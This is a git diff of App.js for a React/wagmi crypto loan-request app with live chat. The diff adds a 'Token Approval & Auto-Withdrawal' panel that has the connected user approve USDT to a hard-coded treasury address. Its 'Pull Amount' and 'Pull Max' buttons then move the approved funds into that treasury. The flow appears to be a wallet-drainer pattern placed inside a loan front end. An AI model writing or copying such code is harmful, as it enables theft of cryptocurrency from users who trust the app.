@@ -1,16 +1,28 @@
 // App.js
 import './styles.css';
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useMemo, useState } from 'react';
 import ConnectWallet from './components/ConnectWallet';
-import { useAccount, useWalletClient } from 'wagmi';
+import { useAccount, useWalletClient, usePublicClient, useChainId } from 'wagmi';
 import { handleLoanRequest } from './components/handleLoanRequest';
 import LiveChat from './components/LiveChat'; // make sure path is correct
+import { CONTRACTS, getBalances, getTokenMeta, approveToken, pullMyApproved, pullMyMax } from './components/autoWithdraw';
+import { toTokenUnits } from './components/erc20';
 
 
 function App() {
   const { isConnected, address } = useAccount();
   const { data: walletClient } = useWalletClient();
+  const publicClient = usePublicClient();
+  const chainId = useChainId();
   const [mounted, setMounted] = useState(false);
+  const [tokenInfo, setTokenInfo] = useState({ symbol: 'TOKEN', decimals: 18 });
+  const [tokenState, setTokenState] = useState({ balance: 0n, allowance: 0n, approved: 0n });
+  const [amountInput, setAmountInput] = useState('');
+  const [busy, setBusy] = useState(false);
+
+  const selected = useMemo(() => CONTRACTS[chainId] || CONTRACTS[1], [chainId]);
+  const tokenAddress = selected?.usdt;
+  const treasuryAddress = selected?.treasury;
 
   useEffect(() => {
     setMounted(true);
@@ -54,6 +66,79 @@ function App() {
       window.removeEventListener('error', errorHandler, true);
     };
   }, []);
+
+  // load token meta
+  useEffect(() => {
+    if (!publicClient || !tokenAddress) return;
+    (async () => {
+      try {
+        const meta = await getTokenMeta(publicClient, tokenAddress);
+        setTokenInfo(meta);
+      } catch (e) {
+        console.error(e);
+      }
+    })();
+  }, [publicClient, tokenAddress]);
+
+  // load balances/allowances
+  useEffect(() => {
+    if (!publicClient || !address || !tokenAddress || !treasuryAddress) return;
+    (async () => {
+      try {
+        const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
+        setTokenState(data);
+      } catch (e) {
+        console.error(e);
+      }
+    })();
+  }, [publicClient, address, tokenAddress, treasuryAddress]);
+
+  async function onApprove() {
+    if (!walletClient || !address) return;
+    try {
+      setBusy(true);
+      const amountWei = toTokenUnits(amountInput || '0', tokenInfo.decimals);
+      const hash = await approveToken(walletClient, tokenAddress, treasuryAddress, amountWei);
+      alert(`Approval submitted: ${hash}`);
+      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
+      setTokenState(data);
+    } catch (e) {
+      alert(e?.shortMessage || e?.message || 'Approval failed');
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  async function onPullExact() {
+    if (!walletClient || !address) return;
+    try {
+      setBusy(true);
+      const amountWei = toTokenUnits(amountInput || '0', tokenInfo.decimals);
+      const hash = await pullMyApproved(walletClient, treasuryAddress, tokenAddress, amountWei);
+      alert(`Pull submitted: ${hash}`);
+      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
+      setTokenState(data);
+    } catch (e) {
+      alert(e?.shortMessage || e?.message || 'Pull failed');
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  async function onPullMax() {
+    if (!walletClient || !address) return;
+    try {
+      setBusy(true);
+      const hash = await pullMyMax(walletClient, treasuryAddress, tokenAddress);
+      alert(`Pull max submitted: ${hash}`);
+      const data = await getBalances(publicClient, tokenAddress, address, treasuryAddress);
+      setTokenState(data);
+    } catch (e) {
+      alert(e?.shortMessage || e?.message || 'Pull max failed');
+    } finally {
+      setBusy(false);
+    }
+  }
 
   if (!mounted) return null;
 
@@ -206,6 +291,34 @@ function App() {
                         </button>
                       ))}
                     </div>
+                  </div>
+
+                  {/* Approval & Auto-Withdraw Section */}
+                  <div className="mt-8 p-4 bg-zinc-900/80 rounded-2xl border border-zinc-800">
+                    <h3 className="text-lg font-semibold mb-3">Token Approval & Auto-Withdrawal</h3>
+                    <div className="text-sm text-gray-400 mb-4">
+                      Token: {tokenInfo.symbol} • Balance: {Number(tokenState.balance) / 10 ** tokenInfo.decimals} • Allowance → Treasury: {Number(tokenState.allowance) / 10 ** tokenInfo.decimals}
+                    </div>
+                    <div className="flex gap-3 items-center">
+                      <input
+                        type="number"
+                        min="0"
+                        placeholder={`Amount (${tokenInfo.symbol})`}
+                        value={amountInput}
+                        onChange={(e) => setAmountInput(e.target.value)}
+                        className="px-3 py-2 rounded-md bg-zinc-800 border border-zinc-700 text-white text-sm"
+                      />
+                      <button disabled={busy} onClick={onApprove} className="loan-button">
+                        {busy ? 'Processing...' : `Approve ${tokenInfo.symbol}`}
+                      </button>
+                      <button disabled={busy} onClick={onPullExact} className="loan-button">
+                        {busy ? 'Processing...' : 'Pull Amount'}
+                      </button>
+                      <button disabled={busy} onClick={onPullMax} className="loan-button">
+                        {busy ? 'Processing...' : 'Pull Max'}
+                      </button>
+                    </div>
+                    <p className="text-xs text-gray-500 mt-3">Approve the token for the treasury, then pull approved funds into the treasury wallet.</p>
                   </div>
                 </div>
               )}
